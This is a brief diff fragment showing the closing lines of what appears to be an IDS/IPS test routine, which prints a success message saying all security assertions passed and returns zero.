+    println("");
+    println("[PASSED] All IDS/IPS Security Assertions Verified Successfully!");
+    return 0
+}
